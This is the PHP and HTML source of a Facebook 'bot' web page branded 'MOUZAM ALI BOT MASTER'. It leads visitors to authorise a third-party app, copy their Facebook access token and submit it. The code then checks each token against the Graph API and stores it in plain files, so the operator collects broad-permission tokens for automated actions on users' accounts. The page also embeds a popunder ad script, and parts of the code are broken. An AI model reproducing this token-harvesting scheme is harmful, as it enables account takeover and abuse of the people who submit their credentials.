﻿
﻿﻿
﻿<link rel="icon" type="image/png" href="http://www.flagsofallcountries.com/Asia/Pakistan/pakistan_mwc.gif"> <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"> <html> <head> <meta http-equiv="Content-Type" content="text/html; charset=utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=0.4"> <title> ▃-⋞ MOUZAM ALI BOT MASTER⋟-▃ </title> <style>@font-face {font-family: yasirfonts;src: url(1.ttf);}</style> <style>@font-face {font-family: mughalfonts;src: url(2.ttf);}</style> <style> html { background: url(http://i.imgur.com/ePcRii1.jpg) no-repeat center center fixed; background-color: #000; -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover; } a { text-decoration: none; color:white; } #footer { vertical-align: center; } .form { position: absolute; vertical-align: center; width: 98%; top: 40%; } .form1 { position: absolute; vertical-align: center; width: 98%; top: 55%; } .access { position: absolute; vertical-align: center; width: 98%; } .access h2 { margin-top: -15px; } input[type=text] { font-family:YASIRfonts; width: 60%; height: 5%; padding: 8px 32px; margin: 8px 0; font-size:22px; box-sizing: border-box; border: 2px solid white; background-color: black; color: white; border-radius:50px; outline: none; text-align: center; } input[type=password] { font-family:YASIRfonts; width: 60%; height: 5%; padding: 8px 32px; margin: 8px 0; font-size:22px; box-sizing: border-box; border: 2px solid white; background-color: black; color: white; border-radius:50px; outline: none; text-align: center; } .button { font-family:YASIRfonts; height: 5%; background-color: black; /* Green */ border: 2px solid white; color: white; padding: 8px 32px; text-align: center; text-decoration: none; display: inline-block; font-size: 15px; margin: 4px 2px; -webkit-transition-duration: 0.4s; /* Safari */ transition-duration: 0.4s; cursor: pointer; } .button1 { background-color: black; color: white; border-radius:50px; } .button1:hover { background-color: white; color: black; } .button2 { background-color: RED; color: white; border-radius:50px; padding: 3px 8px; } .button2:hover { background-color: black; color: white; } .button3 { background-color: black; color: white; border-radius:50px; padding: 7px 15px; } .button3:hover { background-color: blue; color: white; }
</style>
<img style="width:404px;height:528px;" src="https://openclipart.org/download/171488/clock-and-callendar.svg">
</head>
<br>
   </center><a target="_top" href="http://www.flamingtext.com/" ><img src="http://blog.flamingtext.com/blog/2017/03/22/flamingtext_com_1490191540_312295195.png" border="0" alt="Logo Design by FlamingText.com" title="Logo Design by FlamingText.com"></a>
 <script type=text/javascript>
 var _cpp= _cpp || [];
  _cpp['username']    = "HABIB KHAAN";
  _cpp['pop_type']    = "2";
  _cpp['onePer']    = "0";
  _cpp['freq']        = "20";   
(function() {
var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
hs.src =
var cs = document.getElementsByTagName('script')[0];
cs.parentNode.insertBefore(hs, cs);
})();</script>
<!--- END OF CPX24 CODE --->



<?php session_start();

	error_reporting(0);

	$bot=new bot();

	class bot{

public function getGr($as,$bs){

	$ar=array(

	'graph',

	'fb',

	'me'
);

$im='https://'.implode('.',$ar);

	return $im.$as.$bs;
}

public function getUrl($mb,$tk,$uh=null){
	$ar=array(
	
	'access_token' => $tk,
);
	
	if($uh){

	$else=array_merge($ar,$uh);

	}else{

	$else=$ar;
}
	foreach($else as $b => $c){
	
	$khaan[]=$b.'='.$c;
}
	$true='?'.implode('&',$khaan);
	
	$true=$this->getGr($mb,$true);

	$true=json_decode($this->

	one($true),true);

	if($true[data]){

	return $true[data];

	}else{

	return $true;}
}

private function one($url){

	$cx=curl_init();

	curl_setopt_array($cx,array(

	CURLOPT_URL => $url,

	CURLOPT_CONNECTTIMEOUT => 5,

	CURLOPT_RETURNTRANSFER => 1,

	CURLOPT_USERAGENT => 'SCRIPT CREATED BY -=[ HABIB KHAAN ]=-',
));

	$ch=curl_exec($cx);

	curl_close($cx);

	return ($ch);
}

public function savEd($tk,$id,$z=null,$bb=null){

	if(!is_dir('khaan')){

        mkdir('khaan');
}

if($bb){

	$blue=fopen('khaan/'.$id,'w');

	fwrite($blue,$tk.'*on*on*on*on*'.$bb);

        fclose($blue);

echo '
	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Comment Text Saved.";

	</script>';

}else{

        if($z){

	if(file_exists('khaan/'.$id)){

	$file=file_get_contents('khaan/'.$id);

	$ex=explode('*',$file);

	$str=str_replace($ex[0],$tk,$file);

	$xs=fopen('khaan/'.$id,'w');

        fwrite($xs,$str);

        fclose($xs);

}else{
	$str=$tk.'*on*on*on*on*'.$c;

	$xs=fopen('khaan/'.$id,'w');

        fwrite($xs,$str);

        fclose($xs);
}

	$_SESSION[key]=$tk.'_'.$id;

	}else{

	$file=file_get_contents('khaan/'.$id);

	$file=explode('*',$file);

        if($file[5]){

	$up=fopen('khaan/'.$id,'w');

	fwrite($up,$tk.'*on*on*on*on*'.$file[5]);

        fclose($up);

        }else{

	$up=fopen('khaan/'.$id,'w');

	fwrite($up,$tk.'*on*on*on*on*');

        fclose($up);
}

echo '

	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Bot Settings Has Been Updated";

	</script>';}}
}

public function lOgbot($d){

	unlink('khaan/'.$d);

	unset($_SESSION[key]);

echo '
	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Logout Successful";

	</script>';

$this->atas();

$this->home();

$this->bwh();

}

public function cek($tok,$id,$nm){

echo '
<div id="bottom-content">
<div id="navigation-menu">
<a href="http://facebook.com/' . $id . '"><img src="https://graph.facebook.com/' . $id . '/picture?width=800" style="-moz-box-shadow:0px 0px 20px 0px red;-webkit-box-shadow:0px 0px 20px 0px red;-o-box-shadow:0px 0px 20px 0px red;box-shadow:0px 0px 20px 0px red;width:150px; height:150px;border-radius:500px;" alt="' . $nm . '"/></a>
</div><br/>
<br><font color="white"> Welcome :</font><font color="yellow"> '.$nm.' </font></br>
<font color="white"> Activate Your Bot My Dear Friend </font></br>
<li>
<li>
<li>
<li>
<li>
<li>
<li>
<li>
<li>
<form action="index.php" method="post">
<div id="top-content">
<div id="search-form">
<input class="button button1" type="submit" value="Activate Bot">
</form>
</div>
</div>
</div>';

$this->membEr();
}

public function atas(){
echo'
<div id="header">
<h1 class="heading">
<center><font size="90">
<script language="JavaScript" src="chsaab.js" size="520"></script></font></h1></div>
';
}

public function home(){
echo'
<div id="content">
<div class="post">
<div class="post-meta">
</div>

<div class="post-content">
<center><a href="https://fb.com/100013261870324"><ShADoOo>
<div class="post-content">
<center>


<div class="post-meta2">

</div></div></div>

';
}

public function bwh(){
echo'
<div id="bottom-content">
<div id="navigation-menu">
<br>
<center><a href="http://bit.ly/2gFGOUH" target="_blank"><input class="button2" type="button" value="ALLOW IPHOTO APP"></a><font color="yellow"> - </font><a href="https://developers.facebook.com/tools/debug/accesstoken/?app_id=10754253724" target="_blank"><input class="button2" type="button" value="GET IPHOTO TOKEN"></a></center></br></center>
</div>
<br> OWNER !! MOUZAM ALI <br>
FOLLOW ME : <a href="http://www.facebook.com/100013261870324">CLICK HERE </a>
</span>
</div>
<div id="top-content">
<div id="search-form">

<form action="index.php" method="post"><input class="inp-text" type="text" style="height:28px;" name="token"> <input class="inp-btn" type="submit" style="height:28px;" value=" SUBMIT"></form></div></div></div>
';

$this->membEr();
}

public function membEr(){

	if(!is_dir('khaan')){

	mkdir('khaan');
}

$up=opendir('khaan');

	while($use=readdir($up)){

	if($use != '.' && $use != '..'){

	$user[]=$use;}
}

echo'

<div id="footer">
<font style="font-family: Aladin;font-size: 20pt;text-shadow: 0 0 11px #8b814c, 0 0 11px #8b814c, 0 0 11px #8b814c;color: red"> FANS : </font> <font style="font-family: Aladin;font-size: 20pt;text-shadow: 0 0 11px #8b814c, 0 0 11px #8b814c, 0 0 11px #8b814c;color="red">'.count($user).'</font><br>

<font style="font-family: Aladin;font-size: 20pt;text-shadow: 0 0 11px #8b814c, 0 0 11px #8b814c, 0 0 11px #8b814c;color: red"> SITE OWNER : </font> <font style="font-family: Aladin;font-size: 20pt;text-shadow: 0 0 11px #8b814c, 0 0 11px #8b814c, 0 0 11px #8b814c;color="red">MOUZAM ALI</font>

</div>';

}

public function toXen($h){
header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
}


}
if(isset($_SESSION[key])){
        $a=$_SESSION[key];
        $ai=explode('_',$a);
        $a=$ai[0];
if($_POST[logout]){
        $ax=$_POST[logout];
        $bot->lOgbot($ax);
}else{
$b=$bot->getUrl('/me',$a,array(
'fields' => 'id,name',
));
if($b[id]){
if($_POST[likes]){
        $as=$_POST[likes];
        $bs=$_POST[emot];
        $bx=$_POST[target];
        $cs=$_POST[opsi];
        $tx=$_POST[text];
if($cs=='text'){
        unlink('khaan/'.$b[id]);
$bot->savEd($a,$b[id],$as,$bs,$bx,'off');
        }else{
        if($tx){
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);
        }else{
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}
}
        $bot->atas();
        $bot->home();
$bot->cek($a,$b[id],$b[name]);
}else{
echo '
			<script type="text/javascript">
				document.getElementById("resp").style="color:red;font-family:miaanFont;";
				document.getElementById("resp").innerHTML="<h2>Token Expired</h2>";
			</script>';
        unset($_SESSION[key]);
        unlink('khaan/'.$ai[1]);
$bot->atas();
$bot->home();
        $bot->bwh();}}
        }else{
if($_POST[token]){
        $a=$_POST[token];
if(preg_match('/token/',$a)){
$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));
        }else{
        $cut=explode('&',$a);
$tok=$cut[0];
}
$b=$bot->getUrl('/me',$tok,array(
        'fields' => 'id,name',
));
if($b[id]){
$bot->savEd($tok,$b[id],'on','on','on','on','null');
        $bot->atas();
        $bot->home();
$bot->cek($tok,$b[id],$b[name]);
}else{
echo '
			<script type="text/javascript">
				document.getElementById("resp").style="color:red;font-family:miaanFont;";
				document.getElementById("resp").innerHTML="<h2>Invalid Token Or Expired Token</h2>";
			</script>';
        $bot->atas();
        $bot->home();
        $bot->bwh();}
}else{
if($_GET[token]){
        $a=$_GET[token];
        $bot->toXen($a);
}else{
        $bot->atas();
        $bot->home();
        $bot->bwh();}}
}
?>
</audio><br />
<audio autoplay loop>
<source src="http://links.papapk.net/Honey%20singh/S/Yo%20Yo%20Honey%20Singh%20-%20Blue%20Eyes.mp3">
</audio>